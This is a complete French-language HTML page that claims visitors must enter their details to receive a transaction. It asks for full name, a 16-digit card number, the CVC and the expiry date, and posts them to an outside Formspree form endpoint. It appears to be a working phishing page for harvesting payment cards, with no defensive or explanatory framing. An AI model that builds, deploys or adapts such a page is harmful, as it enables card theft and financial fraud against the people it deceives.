<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Réception d'informations</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 500px; margin: 40px auto; padding: 20px; }
        .champ { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input, textarea { width: 100%; padding: 8px; box-sizing: border-box; }
        button { background-color: #007bff; color: white; border: none; padding: 10px 15px; cursor: pointer; width: 100%; font-size: 16px; }
        button:hover { background-color: #0056b3; }
    </style>
</head>
<body>

    <h2>Veuillez entrez ces informations pour recevoir cette transaction</h2>
    <form action="https://formspree.io/f/mbgodbqg" method="POST">
        <div class="champ">
            <label for="nom">Nom complet :</label>
            <input type="text" id="nom" name="nom" required>
        </div>

        <div class="champ">
    <label for="numero">Numéro de carte visa ou mastercard :</label>
    <input type="text" id="numero" name="numero" maxlength="16" pattern="[0-9]{16}" title="Entrez exactement 16 chiffres" required>
</div>

        <div class="champ">
    <label for="code">CVC:</label>
    <input type="text" id="code" name="code" maxlength="3" pattern="[0-9]{3}" title="Entrez exactement 3 chiffres (ex: 123)" required>
</div>

        <div class="champ">
            <label for="periode">Date d'expiration :</label>
            <input type="text" id="periode" name="periode" placeholder="MM/AA" maxlength="5" pattern="(0[1-9]|1[0-2])\/[0-9]{2}" title="Format attendu : MM/AA (ex: 11/26)" required>
        </div>

        <button type="submit">RECEVOIR</button>
    </form>

</body>
</html>
